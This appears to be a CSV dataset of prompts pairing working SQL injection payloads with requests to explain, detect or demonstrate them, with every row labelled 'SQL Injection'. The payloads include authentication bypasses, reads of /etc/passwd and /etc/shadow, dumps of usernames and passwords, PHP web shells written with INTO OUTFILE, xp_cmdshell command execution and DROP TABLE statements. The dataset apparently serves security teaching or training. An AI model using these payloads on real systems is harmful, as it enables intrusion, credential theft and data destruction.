prompt,attack_type
Write a natural-language explanation of this SQL injection string: 1 UNION SELECT load_file('/etc/passwd'),SQL Injection
Describe a scenario where a hacker uses this payload: ' OR EXISTS(SELECT name FROM sqlite_master WHERE sql LIKE '%table%') --,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' UNION SELECT NULL,NULL,NULL ORDER BY 3 --",SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR 1=1; DROP TABLE admin --,SQL Injection
"How would you detect the presence of this SQLi payload: ' OR IF(1=1,1,0)%23",SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR CAST(version() AS CHAR) LIKE '%' --,SQL Injection
Generate a security explanation for this SQLi payload: ' OR 1=1 AND (SELECT COUNT(*) FROM sqlite_master)>0 --,SQL Injection
Describe how this payload can bypass authentication: 1 UNION SELECT group_concat(column_name) FROM information_schema.columns,SQL Injection
"Write a natural-language explanation of this SQL injection string: ' UNION SELECT NULL,hex(database()) --",SQL Injection
"Explain how this SQL injection payload works: ' OR BENCHMARK(10000,MD5(1)) INTO OUTFILE '/tmp/y' --",SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR SLEEP(10)/*,SQL Injection
Generate a security explanation for this SQLi payload: ' OR CAST('a' AS CHAR)='a' --,SQL Injection
Describe how this payload can bypass authentication: 1 OR (SELECT SLEEP(3)),SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR length((SELECT sqlite_version()))>0 --,SQL Injection
Show how an attacker might use this SQL injection: ' OR (SELECT user()) REGEXP 'root' --,SQL Injection
Explain how this SQL injection payload works: ' OR 1=1 INTO DUMPFILE '/var/lib/mysql/x3.bin' --,SQL Injection
"Show how an attacker might use this SQL injection: ' AND IF((SELECT LENGTH(database()))>1,SLEEP(2),0) --",SQL Injection
Describe a scenario where a hacker uses this payload: ' OR (SELECT 1 ORDER BY 1)>0 --,SQL Injection
"Describe how this payload can bypass authentication: ' OR JSON_EXTRACT('{""a"":1}','$.a')=1 --",SQL Injection
Show how an attacker might use this SQL injection: ' OR LOAD_FILE('/etc/shadow') IS NOT NULL --,SQL Injection
"What happens if a user enters this SQL injection into a login field: ' OR JSON_LENGTH('[1,2]')=2 --",SQL Injection
Describe a scenario where a hacker uses this payload: ' OR TRUE UNION ALL SELECT database() --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR (SELECT LENGTH(LOAD_FILE('/etc/passwd')))>0 --,SQL Injection
Show how an attacker might use this SQL injection: ' RETURNING load_file('/proc/cpuinfo') --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR (SELECT LENGTH(group_concat(table_name)))>0 RETURNING * --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' RETURNING load_file('/proc/version') --,SQL Injection
"Generate a security explanation for this SQLi payload: ' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users' --",SQL Injection
"Show how an attacker might use this SQL injection: ' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL --",SQL Injection
Demonstrate how this SQL injection exposes database data: ' AND LENGTH(database())>0 --,SQL Injection
What happens if a user enters this SQL injection into a login field: 1 UNION SELECT group_concat(column_name) FROM information_schema.columns,SQL Injection
How would you detect the presence of this SQLi payload: ' OR (SELECT LENGTH(@@version)))>0 --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR 1 REGEXP '.*' --,SQL Injection
"How would you detect the presence of this SQLi payload: ' UNION SELECT NULL,CONCAT(user(),0x3a,database()) --",SQL Injection
How would you detect the presence of this SQLi payload: ' OR FALSE != TRUE --,SQL Injection
"How would you detect the presence of this SQLi payload: ' OR 1=1 AND JSON_EXTRACT('[""root""]','$[0]')='root' --",SQL Injection
Generate a security explanation for this SQLi payload: ' OR CAST((SELECT @@version) AS CHAR) LIKE '%' --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>=1 --,SQL Injection
Write a natural-language explanation of this SQL injection string: admin' OR 1=1 --,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' OR IF(1=1,1,0)%23",SQL Injection
"Describe how this payload can bypass authentication: ' OR CONCAT_WS(':',user(),database(),version()) LIKE '%' --",SQL Injection
Describe how this payload can bypass authentication: ' AND length((SELECT schema_name FROM information_schema.schemata LIMIT 1))>0 --,SQL Injection
Describe a scenario where a hacker uses this payload: ' UNION SELECT TO_BASE64(load_file('/etc/passwd')) --,SQL Injection
Show how an attacker might use this SQL injection: ' AND (SELECT 1337)=1337 --,SQL Injection
"Explain how this SQL injection payload works: ' OR JSON_EXTRACT('{""x"":5}','$.x')=5 --",SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR TRUE UNION ALL SELECT user() --,SQL Injection
Explain how this SQL injection payload works: ' OR JSON_TYPE('1')='INTEGER' --,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' OR IF((SELECT 1 FROM users LIMIT 1)=1,SLEEP(3),0) --",SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR LOAD_FILE('/proc/version') LIKE '%' --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name LIKE '%user%') --,SQL Injection
Generate a security explanation for this SQLi payload: ' OR TRUE; RESET QUERY CACHE --,SQL Injection
Describe how this payload can bypass authentication: ' OR current_database() LIKE '%' --,SQL Injection
Describe how this payload can bypass authentication: ' OR 'admin' IN (SELECT username FROM users) --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR (SELECT 1 ORDER BY 1)>0 --,SQL Injection
Generate a security explanation for this SQLi payload: ' UNION SELECT LOAD_FILE('/etc/shadow') --,SQL Injection
Describe how this payload can bypass authentication: 1; EXEC xp_cmdshell 'dir',SQL Injection
Describe how this payload can bypass authentication: ' OR CAST((SELECT @@version) AS CHAR) LIKE '%' --,SQL Injection
Show how an attacker might use this SQL injection: ' OR session_user LIKE '%' --,SQL Injection
Show how an attacker might use this SQL injection: ' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '%') --,SQL Injection
"Describe how this payload can bypass authentication: ' OR 1 IN (1,2,3) --",SQL Injection
Explain how this SQL injection payload works: ' OR 1=1 INTO OUTFILE '/var/tmp/output.txt' --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR CAST(1 AS SIGNED)=1 --,SQL Injection
Show how an attacker might use this SQL injection: ' OR TRUE; KILL QUERY 3 --,SQL Injection
"Demonstrate how this SQL injection exposes database data: ' OR IF((SELECT 'a'='a'),1,0) --",SQL Injection
Demonstrate how this SQL injection exposes database data: ' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/s.php' --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR (SELECT @@GLOBAL.max_connections)>0 --,SQL Injection
Describe a scenario where a hacker uses this payload: 1 AND 1=(SELECT COUNT(*) FROM users),SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR 1=1; EXEC master..xp_cmdshell 'net user' --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR (SELECT LENGTH(database()))>0 RETURNING * --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR TRUE AND 'a'='a,SQL Injection
Show how an attacker might use this SQL injection: ' AND LENGTH(database())>0 --,SQL Injection
"How would you detect the presence of this SQLi payload: ' OR MOD(4,2)=0 --",SQL Injection
Describe how this payload can bypass authentication: ' ORDER BY 5--,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR TRUE; SELECT user() --,SQL Injection
"Describe how this payload can bypass authentication: ' OR MOD(4,2)=0 --",SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR 1=1--/**/,SQL Injection
Generate a security explanation for this SQLi payload: ' OR EXISTS(SELECT NULL) RETURNING * --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR 1=1 AND CONNECTION_ID()>0 --,SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1; EXEC master..xp_cmdshell 'type C:\boot.ini' --,SQL Injection
"Describe how this payload can bypass authentication: ' UNION SELECT NULL,@@tmpdir --",SQL Injection
How would you detect the presence of this SQLi payload: ' OR 'x'='x'; DROP TABLE users --,SQL Injection
Show how an attacker might use this SQL injection: ' OR EXISTS(SELECT 1 FROM pg_user LIMIT 1) --,SQL Injection
"Demonstrate how this SQL injection exposes database data: ' OR IF((SELECT 1 FROM users LIMIT 1)=1,SLEEP(3),0) --",SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR system_user LIKE '%' --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR 1=1 INTO DUMPFILE '/var/lib/mysql/x1.bin' --,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' OR CONCAT(database(),',',user()) LIKE '%' --",SQL Injection
How would you detect the presence of this SQLi payload: ' OR 1=1# ORDER BY 1,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR TRUE%20--,SQL Injection
"Write a natural-language explanation of this SQL injection string: ' UNION SELECT JSON_OBJECT('user',user(),'db',database()) --",SQL Injection
Show how an attacker might use this SQL injection: ' AND 1=(SELECT 1 FROM mysql.user LIMIT 1) --,SQL Injection
Describe how this payload can bypass authentication: ' OR current_database() LIKE '%' --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR 1=1 RETURNING (SELECT hex(user())) --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR (SELECT LENGTH(@@version)))>0 --,SQL Injection
Explain how this SQL injection payload works: ' OR 1=1; #,SQL Injection
"Describe a scenario where a hacker uses this payload: ' OR MOD(4,2)=0 --",SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR 1=1 AND 'a'='a --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR 1=1;%00,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' OR 1=1 AND JSON_EXTRACT('[""root""]','$[0]')='root' --",SQL Injection
"Demonstrate how this SQL injection exposes database data: ' OR COALESCE(NULL,1)=1 --",SQL Injection
Explain how this SQL injection payload works: ' OR CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS CHAR) LIKE '%' --,SQL Injection
Show how an attacker might use this SQL injection: ' RETURNING current_database() --,SQL Injection
Show how an attacker might use this SQL injection: ' OR '1'='1,SQL Injection
"Describe how this payload can bypass authentication: ' OR 1=1 LIMIT 0,1 --",SQL Injection
Describe how this payload can bypass authentication: ' AND (SELECT COUNT(*) FROM users)>0 --,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' UNION SELECT LOAD_FILE('/etc/hosts'),NULL,NULL --",SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR (SELECT LENGTH(LOAD_FILE('/var/log/messages'))) > 0 --,SQL Injection
"Describe how this payload can bypass authentication: ' UNION SELECT name,NULL FROM sqlite_master WHERE type='table' --",SQL Injection
Show how an attacker might use this SQL injection: ' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS' --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR 1=1 RETURNING (SELECT hex(user())) --,SQL Injection
Show how an attacker might use this SQL injection: ' OR 1=1#test,SQL Injection
Explain how this SQL injection payload works: ' OR 1=1 INTO OUTFILE '/usr/share/nginx/html/cmd.php' --,SQL Injection
"Describe a scenario where a hacker uses this payload: ' UNION SELECT NULL,username,password FROM users --",SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR 'x'='x'; DROP TABLE users --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR TRUE; KILL QUERY 3 --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR LOAD_FILE('/proc/version') LIKE '%' --,SQL Injection
"Write a natural-language explanation of this SQL injection string: ' OR COALESCE(NULL,1)=1 --",SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR TRUE; SELECT load_file('/etc/passwd') --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR FLOOR(1.9)=1 --,SQL Injection
"What happens if a user enters this SQL injection into a login field: ' UNION SELECT NULL,version() --",SQL Injection
Explain how this SQL injection payload works: ' OR TRUE INTO DUMPFILE '/tmp/any.bin' --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR (SELECT LENGTH(LOAD_FILE('/etc/passwd')))>0 --,SQL Injection
Generate a security explanation for this SQLi payload: ' OR EXISTS(SELECT 1) --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' AND (SELECT UPPER('a'))='A' --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1; SELECT hex(load_file('/etc/passwd')) --,SQL Injection
Explain how this SQL injection payload works: ' OR (SELECT table_name FROM information_schema.tables LIMIT 1) LIKE '%' --,SQL Injection
"Explain how this SQL injection payload works: ' UNION SELECT null,concat(username,':',password) FROM users --",SQL Injection
How would you detect the presence of this SQLi payload: ' OR 1=1 COLLATE utf8_general_ci --,SQL Injection
Demonstrate how this SQL injection exposes database data: 1 AND (SELECT LENGTH(database()))>0,SQL Injection
"Demonstrate how this SQL injection exposes database data: ' UNION SELECT LOAD_FILE('/etc/hosts'),NULL,NULL --",SQL Injection
Describe a scenario where a hacker uses this payload: ' OR (SELECT '<?php phpinfo(); ?>') INTO OUTFILE '/tmp/info.php' --,SQL Injection
"Demonstrate how this SQL injection exposes database data: ' OR POW(2,2)=4 --",SQL Injection
Show how an attacker might use this SQL injection: ' OR 1=1 RETURNING (SELECT user()) --,SQL Injection
Generate a security explanation for this SQLi payload: ' OR 1=1 WAITFOR DELAY '00:00:03' --,SQL Injection
Show how an attacker might use this SQL injection: ' OR current_user LIKE '%'-- RETURNING *,SQL Injection
How would you detect the presence of this SQLi payload: ' OR 1=1 RETURNING row_to_json(pg_catalog.pg_user) --,SQL Injection
"Write a natural-language explanation of this SQL injection string: ' OR 'a' IN ('a','b','c') --",SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR 1=1; EXEC master..xp_cmdshell 'type C:\boot.ini' --,SQL Injection
"How would you detect the presence of this SQLi payload: 1'; INSERT INTO admin(username,password) VALUES('hax','123') --",SQL Injection
Show how an attacker might use this SQL injection: ' OR 1=1 AND 1=1 ORDER BY 3 --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1 ORDER BY 5 --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR (SELECT quote(name) FROM sqlite_master LIMIT 1) LIKE '%' --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR EXISTS(SELECT * FROM mysql.user WHERE password!='') --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR EXISTS(SELECT * FROM information_schema.tables) RETURNING * --,SQL Injection
Describe how this payload can bypass authentication: ' OR EXISTS(SELECT * FROM dual) --,SQL Injection
Generate a security explanation for this SQLi payload: ' OR (SELECT LENGTH(@@version))>1 --,SQL Injection
What happens if a user enters this SQL injection into a login field: 1; EXEC xp_cmdshell 'dir',SQL Injection
What happens if a user enters this SQL injection into a login field: ' RETURNING current_database() --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR EXISTS(SELECT 1 FROM mysql.user WHERE user LIKE '%') --,SQL Injection
"How would you detect the presence of this SQLi payload: ' OR JSON_VALID('{""a"":1}')=1 --",SQL Injection
Write a natural-language explanation of this SQL injection string: ' INTO OUTFILE '/tmp/shell.phtml' RETURNING * --,SQL Injection
Generate a security explanation for this SQLi payload: ' OR 1=1-- -,SQL Injection
"How would you detect the presence of this SQLi payload: ' OR 1=1 AND JSON_EXTRACT('[""root""]','$[0]')='root' --",SQL Injection
Describe how this payload can bypass authentication: ' AND (SELECT UPPER('a'))='A' --,SQL Injection
"What happens if a user enters this SQL injection into a login field: 1 AND 1=CONVERT(int,@@version)",SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR ''=''%20--,SQL Injection
"Generate a security explanation for this SQLi payload: ' AND IF((SELECT LENGTH(database()))>1,SLEEP(2),0) --",SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR 1 BETWEEN 1 AND 2 --,SQL Injection
Generate a security explanation for this SQLi payload: ' INTO OUTFILE '/tmp/db-dump.txt' --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' RETURNING hex(load_file('/etc/group')) --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR TRUE; SET GLOBAL general_log=1 --,SQL Injection
Demonstrate how this SQL injection exposes database data: 1;(SELECT * FROM users),SQL Injection
Show how an attacker might use this SQL injection: ' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0 --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR TRUE; SET GLOBAL innodb_force_recovery=6 --,SQL Injection
Generate a security explanation for this SQLi payload: ' OR 1=1 INTO OUTFILE '/srv/www/shell.php' --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR 1=1; EXEC xp_cmdshell 'whoami' --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR 1=1; SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/rce.php' --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' UNION SELECT banner FROM v$version --,SQL Injection
What vulnerability does this SQL payload try to exploit: 1'; UPDATE accounts SET balance=99999 --,SQL Injection
"How would you detect the presence of this SQLi payload: ' AND IF((SELECT 1 FROM users LIMIT 1)=1,SLEEP(1),0) --",SQL Injection
Explain how this SQL injection payload works: ' OR EXISTS(SELECT NULL) RETURNING * --,SQL Injection
Show how an attacker might use this SQL injection: ' OR 1=1 RETURNING (SELECT hex(user())) --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR (SELECT SLEEP(2)) --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1 AND SLEEP(1) --,SQL Injection
Explain how this SQL injection payload works: ' OR 1=1; DROP TABLE secrets --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1 LIMIT 1 OFFSET 1 --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR (SELECT LENGTH(database()))>1 --,SQL Injection
"Generate a security explanation for this SQLi payload: ' UNION SELECT NULL,NULL,NULL ORDER BY 2 --",SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR (SELECT LENGTH(@@version))>1 --,SQL Injection
Generate a security explanation for this SQLi payload: ' OR NOT(FALSE) --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' RETURNING hex(load_file('/etc/hostname')) --,SQL Injection
Describe how this payload can bypass authentication: ' OR (SELECT COUNT(*) FROM users WHERE username='admin')>0 --,SQL Injection
Explain how this SQL injection payload works: ' OR 1=1# ORDER BY 3,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR 1=1; /*,SQL Injection
What vulnerability does this SQL payload try to exploit: 1 UNION SELECT table_name FROM information_schema.tables,SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1 UNION SELECT NULL ORDER BY 1 --,SQL Injection
Describe how this payload can bypass authentication: ' OR (SELECT SLEEP(2)) --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR current_database() LIKE '%'-- RETURNING *,SQL Injection
What vulnerability does this SQL payload try to exploit: ' RETURNING (SELECT group_concat(schema_name) FROM information_schema.schemata) --,SQL Injection
Generate a security explanation for this SQLi payload: ' INTO OUTFILE '/tmp/shell.php' --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' ORDER BY 999--,SQL Injection
Generate a security explanation for this SQLi payload: ' OR current_user LIKE '%'-- RETURNING *,SQL Injection
Describe how this payload can bypass authentication: ' UNION SELECT table_name FROM all_tables --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1; SELECT * FROM passwords --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR TRUE; SELECT table_name FROM information_schema.tables --,SQL Injection
"Show how an attacker might use this SQL injection: ' OR BENCHMARK(1000000,MD5(1))%23",SQL Injection
Describe how this payload can bypass authentication: ' OR TRUE; SELECT version() FROM pg_catalog.pg_settings LIMIT 1 --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR 3|1=3 --,SQL Injection
Show how an attacker might use this SQL injection: ' OR EXISTS(SELECT * FROM mysql.user) RETURNING * --,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' OR 1=1 RETURNING username,password --",SQL Injection
Generate a security explanation for this SQLi payload: ' OR 1=1--oracle,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR TRUE;%00,SQL Injection
Write a natural-language explanation of this SQL injection string: payload,SQL Injection
What vulnerability does this SQL payload try to exploit: ' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR user() LIKE '%' RETURNING * --,SQL Injection
Explain how this SQL injection payload works: ' OR FALSE != TRUE --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR 1=1 LIMIT 1 OFFSET 1 --,SQL Injection
Describe how this payload can bypass authentication: ' AND (SELECT LOWER('A'))='a' --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1; WAITFOR DELAY '00:00:03' --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR 1=1# ORDER BY 1,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1-- -,SQL Injection
Describe how this payload can bypass authentication: ' OR EXISTS(SELECT relname FROM pg_class) --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' RETURNING (SELECT group_concat(column_name) FROM information_schema.columns) --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR SLEEP(2)/**/--,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR NULL INTO OUTFILE '/var/www/html/test.txt' --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR TRUE INTO DUMPFILE '/tmp/dump.bin' --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR 1=1 RETURNING (SELECT database()) --,SQL Injection
Describe how this payload can bypass authentication: ' OR NOT(FALSE) --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR 1 LIKE BINARY '1' --,SQL Injection
"Show how an attacker might use this SQL injection: ' UNION SELECT usename,passwd FROM pg_shadow --",SQL Injection
"Show how an attacker might use this SQL injection: ' UNION SELECT table_schema,table_name,column_name,NULL,NULL,NULL FROM information_schema.columns --",SQL Injection
Explain how this SQL injection payload works: ' OR ''=''%20--,SQL Injection
Show how an attacker might use this SQL injection: ' OR 1=1; SELECT * FROM credit_cards --,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' OR GREATEST(1,2)=2 --",SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR 1=1 RETURNING sql FROM sqlite_master --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1 ORDER BY 3 --,SQL Injection
"Show how an attacker might use this SQL injection: ' UNION ALL SELECT 1,'admin','pass' --",SQL Injection
What happens if a user enters this SQL injection into a login field: ' INTO DUMPFILE '/tmp/raw.bin' --,SQL Injection
Generate a security explanation for this SQLi payload: ' UNION SELECT group_concat(schema_name) FROM information_schema.schemata --,SQL Injection
"Generate a security explanation for this SQLi payload: ' OR instr((SELECT sql FROM sqlite_master LIMIT 1),'CREATE')>0 --",SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR EXISTS(SELECT * FROM mysql.user) RETURNING * --,SQL Injection
"Describe how this payload can bypass authentication: ' OR JSON_KEYS('{""a"":1}') LIKE '%' --",SQL Injection
Describe how this payload can bypass authentication: ' OR LOAD_FILE('/var/log/auth.log') LIKE '%' --,SQL Injection
Describe how this payload can bypass authentication: ' UNION SELECT table_name FROM all_tables --,SQL Injection
